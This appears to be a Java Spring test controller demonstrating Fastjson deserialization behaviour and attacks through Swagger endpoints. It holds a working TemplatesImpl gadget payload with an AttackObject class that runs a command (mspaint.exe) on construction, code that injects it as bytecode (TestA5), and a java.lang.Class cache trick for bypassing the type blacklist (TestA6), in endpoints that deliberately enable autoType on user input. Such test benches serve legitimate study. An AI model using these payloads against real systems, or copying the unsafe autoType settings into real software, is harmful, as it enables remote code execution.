package cn.moonlord.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.alibaba.fastjson.util.TypeUtils;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import io.swagger.annotations.*;
import org.springframework.web.bind.annotation.*;
import sun.misc.BASE64Encoder;

import java.io.*;

@Api(tags = "FastJson 测试")
@RestController
@RequestMapping("/FastJson")
public class FastJsonTestController {

    public static class SimpleObject implements Serializable {
        private String name;
        public SimpleObject(){
            System.out.println("SimpleObject 构造方法被调用！");
        }
        public String getName() {
            System.out.println("SimpleObject.getName 方法被调用！");
            return name;
        }
        public void setName(String name) {
            System.out.println("SimpleObject.setName 方法被调用！");
            this.name = name;
        }
    }

    public class AttackObject extends AbstractTranslet {
        public AttackObject() throws IOException {
            System.out.println("AttackObject 构造方法被调用！");
            Runtime.getRuntime().exec("mspaint.exe");
        }
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
            System.out.println("AttackObject.transform 1 方法被调用！");
        }
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
            System.out.println("AttackObject.transform 2 方法被调用！");
        }
    }

    private static final String testCaseA1 = "Hello World";
    private static final String testCaseA2 = "{\"@type\":\"cn.moonlord.test.FastJsonTestController$SimpleObject\",\"name\":\"Hello World\"}";
    private static final String testCaseA3 =
            "{" +
                    "\"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                    "\"_bytecodes\" : []," +
                    "\"_name\" : \"AttackObject\"," +
                    "\"_tfactory\" : {}," +
                    "\"outputProperties\" : {}" +
            "}";
    private static final String testCaseA4 =
            "{" +
                    "\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"cn.moonlord.test.FastJsonTestController$SimpleObject\"}," +
                    "\"b\":{\"@type\":\"cn.moonlord.test.FastJsonTestController$SimpleObject\",\"name\":\"Hello World\"}" +
            "}";

    @ApiOperation(value="测试用例 A1，使用 SerializerFeature.WriteClassName 特性，将对象转换为包含 @type 的 Json 字符串")
    @ApiImplicitParams({@ApiImplicitParam(name = "name", value = "name", example = testCaseA1)})
    @GetMapping(value = "/TestA1")
    public String TestA1(@RequestParam String name) {
        SimpleObject simpleObject = new SimpleObject();
        simpleObject.setName(name);
        String jsonString = JSON.toJSONString(simpleObject, SerializerFeature.WriteClassName);
        System.out.println("simpleObject : " + jsonString);
        return jsonString;
    }

    @ApiOperation(value="测试用例 A2，使用 ParserConfig.global.setAutoTypeSupport，将包含 @type 的 Json 字符串解析为对象，对象的构造方法和 getter / setter 方法都会被执行")
    @ApiImplicitParams({@ApiImplicitParam(name = "JsonString", value = "Json 字符串", example = testCaseA2)})
    @GetMapping(value = "/TestA2")
    public String TestA2(@RequestParam String JsonString) {
        ParserConfig.global = new ParserConfig();
        ParserConfig.global.setAutoTypeSupport(true);
        TypeUtils.clearClassMapping();
        Object simpleObject = JSON.parseObject(JsonString);
        System.out.println("simpleObject : " + simpleObject.getClass().getName());
        return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
    }

    @ApiOperation(value="测试用例 A3，使用 ParserConfig.global.addAccept，限制 @type 的 Json 对象的类型的允许范围，允许的会被转换为对象")
    @ApiImplicitParams({@ApiImplicitParam(name = "JsonString", value = "Json 字符串", example = testCaseA2)})
    @GetMapping(value = "/TestA3")
    public String TestA3(@RequestParam String JsonString) {
        ParserConfig.global = new ParserConfig();
        ParserConfig.global.addAccept("cn.moonlord.");
        TypeUtils.clearClassMapping();
        Object simpleObject = JSON.parseObject(JsonString);
        System.out.println("simpleObject : " + simpleObject.getClass().getName());
        return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
    }

    @ApiOperation(value="测试用例 A4，使用 ParserConfig.global.addDeny，限制 @type 的 Json 对象的类型的禁止范围，禁止的会直接报错")
    @ApiImplicitParams({@ApiImplicitParam(name = "JsonString", value = "Json 字符串", example = testCaseA2)})
    @GetMapping(value = "/TestA4")
    public String TestA4(@RequestParam String JsonString) {
        ParserConfig.global = new ParserConfig();
        ParserConfig.global.addAccept("cn.moonlord.safe");
        ParserConfig.global.addDeny("cn.moonlord.test.");
        TypeUtils.clearClassMapping();
        Object simpleObject = JSON.parseObject(JsonString);
        System.out.println("simpleObject : " + simpleObject.getClass().getName());
        return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
    }

    @ApiOperation(value="测试用例 A5，使用 Feature.SupportNonPublicField 特性时，旧版本可构造 TemplatesImpl 进行反序列化攻击，新版本已经被黑名单限制")
    @ApiImplicitParams({@ApiImplicitParam(name = "JsonString", value = "Json 字符串", example = testCaseA3)})
    @GetMapping(value = "/TestA5")
    public String TestA5(@RequestParam String JsonString) {
        String classFile ="target/classes/cn/moonlord/test/FastJsonTestController$AttackObject.class";
        String classContent = "";
        try {
            FileInputStream in = new FileInputStream(new File(classFile));
            byte[] buffer = new byte[in.available()];
            in.read(buffer);
            in.close();
            classContent = (new BASE64Encoder()).encode(buffer);
        } catch (IOException e) {
            e.printStackTrace();
        }
        JsonString = JsonString.replace("[]", "[\"" + classContent + "\"]");
        ParserConfig.global = new ParserConfig();
        TypeUtils.clearClassMapping();
        Object simpleObject = JSON.parseObject(JsonString, Feature.SupportNonPublicField);
        System.out.println("simpleObject : " + simpleObject.getClass().getName());
        return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
    }

    @ApiOperation(value="测试用例 A6，旧版本可使用 java.lang.Class 加载类，利用缓存绕过类型的黑名单限制，新版本已修改为不缓存")
    @ApiImplicitParams({@ApiImplicitParam(name = "JsonString", value = "Json 字符串", example = testCaseA4)})
    @GetMapping(value = "/TestA6")
    public String TestA6(@RequestParam String JsonString) {
        ParserConfig.global = new ParserConfig();
        ParserConfig.global.setAutoTypeSupport(true);
        TypeUtils.clearClassMapping();
        Object simpleObject = JSON.parseObject(JsonString);
        System.out.println("simpleObject : " + simpleObject.getClass().getName());
        return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
    }

}
